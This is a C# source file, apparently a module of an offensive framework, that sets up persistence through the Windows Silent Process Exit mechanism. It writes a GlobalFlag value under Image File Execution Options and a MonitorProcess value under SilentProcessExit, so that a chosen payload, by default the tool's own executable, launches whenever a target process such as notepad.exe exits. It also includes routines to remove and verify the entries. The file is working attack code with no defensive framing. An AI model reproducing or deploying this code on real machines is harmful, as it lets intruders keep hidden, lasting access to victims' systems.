using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string IfeoPath =
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";

        private const string SilentExitPath =
            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\notepad.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultProcess = "notepad.exe";
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 silent_exit Start {defaultProcess} {defaultPayload}";
        }

        public static string Start(string[] args)
        {
            string processName = (args != null &&
                                   args.Length > 0 &&
                                   !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "notepad.exe";

            string payloadPath = (args != null &&
                                  args.Length > 1 &&
                                  !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                // 1. Enable GlobalFlag in IFEO
                using (var ifeoBase =
                    Registry.LocalMachine.OpenSubKey(IfeoPath, writable: true))
                {
                    if (ifeoBase == null)
                        return "[-] Access denied to IFEO registry hive.";

                    using var procKey =
                        ifeoBase.CreateSubKey(processName, writable: true);

                    if (procKey == null)
                        return $"[-] Failed to create IFEO entry for '{processName}'.";

                    procKey.SetValue(
                        "GlobalFlag",
                        0x200,
                        RegistryValueKind.DWord);
                }

                // 2. Set MonitorProcess in SilentProcessExit
                using (var silentBase =
                    Registry.LocalMachine.OpenSubKey(
                        SilentExitPath,
                        writable: true)
                    ?? Registry.LocalMachine.CreateSubKey(
                        SilentExitPath,
                        writable: true))
                {
                    if (silentBase == null)
                        return "[-] Access denied to SilentProcessExit registry hive.";

                    using var procKey =
                        silentBase.CreateSubKey(
                            processName,
                            writable: true);

                    if (procKey == null)
                        return $"[-] Failed to create SilentProcessExit entry for '{processName}'.";

                    procKey.SetValue(
                        "MonitorProcess",
                        payloadPath,
                        RegistryValueKind.String);

                    procKey.SetValue(
                        "ReportingMode",
                        1,
                        RegistryValueKind.DWord);
                }

                return $"[+] Silent Exit installed for '{processName}'. " +
                       $"Payload: '{payloadPath}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Silent Process Exit configuration requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string processName = (args != null &&
                                   args.Length > 0 &&
                                   !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "notepad.exe";

            try
            {
                // 1. Remove IFEO GlobalFlag
                using (var ifeoBase =
                    Registry.LocalMachine.OpenSubKey(IfeoPath, writable: true))
                {
                    using var subKey =
                        ifeoBase?.OpenSubKey(
                            processName,
                            writable: true);

                    subKey?.DeleteValue("GlobalFlag", false);
                }

                // 2. Remove SilentExit entry
                using (var silentBase =
                    Registry.LocalMachine.OpenSubKey(
                        SilentExitPath,
                        writable: true))
                {
                    silentBase?.DeleteSubKeyTree(
                        processName,
                        false);
                }

                return $"[+] Removed Silent Exit monitor for '{processName}'.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Silent Process Exit removal requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string processName = (args != null &&
                                   args.Length > 0 &&
                                   !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "notepad.exe";

            try
            {
                string keyPath =
                    SilentExitPath + "\\" + processName;

                using var silentBase =
                    Registry.LocalMachine.OpenSubKey(keyPath);

                string monitor =
                    silentBase?.GetValue("MonitorProcess") as string;

                if (string.IsNullOrEmpty(monitor))
                    return $"[*] No Silent Exit monitor found for '{processName}'.";

                return $"[+] Verified Silent Exit for '{processName}' -> '{monitor}'";
            }
            catch (Exception ex)
            {
                return $"[-] Unexpected error during verification: {ex.Message}";
            }
        }
    }
}